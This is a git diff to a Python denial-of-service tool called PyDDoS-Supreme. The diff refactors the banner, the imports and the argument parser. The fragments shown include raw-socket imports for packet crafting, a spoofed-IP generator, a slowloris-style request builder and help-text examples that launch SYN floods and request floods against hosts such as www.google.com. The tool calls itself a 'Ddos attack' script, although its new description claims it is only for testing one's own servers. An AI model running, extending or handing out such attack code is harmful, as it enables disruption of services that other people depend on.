@@ -1,11 +1,34 @@
+# Banner function
+def show_banner():
+    banner = r"""
+version = '1.0'
+
+	 ██▓███ ▓██   ██▓▓█████▄ ▓█████▄  ▒█████    ██████ 
+	▓██░  ██▒▒██  ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
+	▓██░ ██▓▒ ▒██ ██░░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
+	▒██▄█▓▒ ▒ ░ ▐██▓░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
+	▒██▒ ░  ░ ░ ██▒▓░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
+	▒▓▒░ ░  ░  ██▒▒▒  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
+	░▒ ░     ▓██ ░▒░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
+	░░       ▒ ▒ ░░   ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
+	         ░ ░        ░       ░        ░ ░        ░  
+	         ░ ░      ░       ░                        
+
+	DDos python script | Script used for testing ddos | Ddos attack
+	Author: DirtyHeroes
+	Github: https://github.com/palacita135/PyDDoS-supreme
+
+	root@kali: python3 pyddos.py --help <for option>
+
+"""
+    print(banner)
+
+# Ensure this runs before parsing arguments
+show_banner()
+
 import urllib.parse
 import http.client
 import random
-from argparse import ArgumentParser, RawTextHelpFormatter
-from socket import socket, AF_INET, SOCK_RAW, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL, gethostbyname
-from threading import Thread, Lock
-from struct import pack
-from random import randrange
 import argparse
 import signal
 import string
@@ -15,26 +38,11 @@ import sys
 import os
 import re
 import shutil
-
-version = '3.0'
-title = '''
-
-		 ██▓███ ▓██   ██▓▓█████▄ ▓█████▄  ▒█████    ██████ 
-		▓██░  ██▒▒██  ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
-		▓██░ ██▓▒ ▒██ ██░░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
-		▒██▄█▓▒ ▒ ░ ▐██▓░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
-		▒██▒ ░  ░ ░ ██▒▓░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
-		▒▓▒░ ░  ░  ██▒▒▒  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
-		░▒ ░     ▓██ ░▒░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
-		░░       ▒ ▒ ░░   ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
-		         ░ ░        ░       ░        ░ ░        ░  
-		         ░ ░      ░       ░                        
-
-	DDos python script | Script used for testing ddos | Ddos attack
-	Author: DirtyHeroes
-	Github: https://github.com/palacita135/PyDDoS-Supreme
-	Version:''' + version + '''
-	'''
+from argparse import ArgumentParser, RawTextHelpFormatter
+from socket import socket, AF_INET, SOCK_RAW, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL, gethostbyname
+from threading import Thread, Lock
+from struct import pack
+from random import randrange
 
 # Check if pip is installed and upgrade it if needed
 if not shutil.which("pip"):
@@ -70,7 +78,6 @@ def fake_ip():
             			continue  # Go back and generate a new IP
         		return '.'.join(ips)  # Return valid I
 
-
 def check_tgt(args):
     		tgt = args.d
     		try:
@@ -94,7 +101,6 @@ def add_bots():
 				"http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8"]
 			return bots  # ✅ Fix: return statement inside function
 
-
 class Pyslow:
     def __init__(self, tgt, port, to, threads, sleep):
         self.tgt = tgt
@@ -104,7 +110,6 @@ class Pyslow:
         self.sleep = sleep
         self.method = ['GET', 'POST']
         self.pkt_count = 0
-
 
 def mypkt(self):
 		text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' +\
@@ -409,20 +414,19 @@ def run(self):
 		except Exception as e:
 			cprint(f"[ERROR] {e}", 'red')
 
-
 def main():
-		parser = ArgumentParser(
-		usage='python3 %(prog)s -t [target] -p [port] -t [number threads]',
-		formatter_class=RawTextHelpFormatter,
-		prog='pyddos',
-		description=cprint(title,'white',attrs=['bold']),
-		epilog='''
-	Example:
-	python3 %(prog)s -d www.example.com -p 80 -T 2000 -Pyslow
-	python3 %(prog)s -d www.domain.com -s 100 -Request
-	python3 %(prog)s -d www.google.com -Synflood -T 5000 -t 10.0
-	'''
-	)
+    parser = ArgumentParser(
+        usage="python3 pyddos.py -d <target> [-p <port>] [-T <threads>] [attack type]",
+        formatter_class=lambda prog: RawTextHelpFormatter(prog, max_help_position=40),
+        prog="pyddos",
+        description="Pyddos - A Python-based DDoS testing tool for stress-testing your own servers.",
+        epilog=("""
+		Examples:
+  		python3 pyddos.py -d www.example.com -p 80 -T 2000 -Pyslow
+  		python3 pyddos.py -d www.domain.com -s 100 -Request
+  		python3 pyddos.py -d www.google.com -Synflood -T 5000 -t 10.0
+""")
+)
 
 # Define parser
 parser = argparse.ArgumentParser(description="Pyddos - DDoS Attack Simulation Tool")
